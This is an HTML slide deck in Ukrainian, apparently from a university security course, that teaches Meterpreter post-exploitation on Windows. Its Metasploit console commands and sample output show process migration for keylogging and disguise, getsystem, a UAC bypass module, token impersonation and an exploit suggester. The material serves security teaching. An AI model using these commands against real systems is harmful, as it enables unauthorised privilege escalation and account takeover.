@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.6 — Міграція та ескалація привілеїв</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Міграція процесів та ескалація привілеїв</h1>
+      <div class="subtitle">Тема 9.6 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Міграція процесів</h2>
+
+      <div class="info-box" style="margin-bottom: 1.5rem;">
+        <strong>Migrate</strong> — переміщення Meterpreter з одного процесу в інший для стабільності, привілеїв або маскування.
+      </div>
+
+      <div class="card-blue" style="margin-bottom: 1.5rem;">
+        <div class="code-block" style="margin-top: 0.5rem; font-size: 0.72em;">
+meterpreter&gt; getpid
+Current pid: 4872 (notepad.exe)     ← нестабільний, може бути закритий
+
+meterpreter&gt; ps
+ PID   Name              User
+ 552   csrss.exe         NT AUTHORITY\SYSTEM
+ 2816  explorer.exe      CORP\jsmith          ← стабільний, для keylog
+ 3120  svchost.exe       NT AUTHORITY\SYSTEM  ← для getsystem
+
+meterpreter&gt; migrate 2816
+[*] Migrating from 4872 to 2816...
+[*] Migration completed successfully.
+        </div>
+      </div>
+
+      <div class="three-col-grid">
+        <div class="card-green">
+          <h3>Стабільність</h3>
+          <p style="font-size: 0.82em; margin-top: 0.5rem;">explorer.exe — не закривається до кінця сесії</p>
+        </div>
+        <div class="card-yellow">
+          <h3>Кейлоггінг</h3>
+          <p style="font-size: 0.82em; margin-top: 0.5rem;">explorer.exe або winlogon.exe для перехоплення вводу</p>
+        </div>
+        <div class="card-purple">
+          <h3>Маскування</h3>
+          <p style="font-size: 0.82em; margin-top: 0.5rem;">svchost.exe — виглядає як легітимний системний процес</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Ескалація привілеїв</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>getsystem</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; getsystem
+...got system via technique 1
+(Named Pipe Impersonation)
+
+meterpreter&gt; getuid
+NT AUTHORITY\SYSTEM
+            </div>
+            <p style="font-size: 0.8em; margin-top: 0.5rem;">Потрібні локальні admin привілеї</p>
+          </div>
+
+          <div class="card-yellow" style="margin-top: 1rem;">
+            <h3>UAC Bypass</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+msf6&gt; use exploit/windows/
+  local/bypassuac_eventvwr
+msf6&gt; set SESSION 1
+msf6&gt; exploit
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-purple">
+            <h3>Token Impersonation</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; use incognito
+
+meterpreter&gt; list_tokens -u
+CORP\Administrator
+CORP\jsmith
+NT AUTHORITY\SYSTEM
+
+meterpreter&gt; impersonate_token
+  "CORP\\Administrator"
+[+] Successfully impersonated
+            </div>
+          </div>
+
+          <div class="card-green" style="margin-top: 1rem;">
+            <h3>Exploit Suggester</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+meterpreter&gt; run post/multi/
+  recon/local_exploit_suggester
+[+] ms16_032_secondary_logon
+[+] cve_2020_0796_smbghost
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
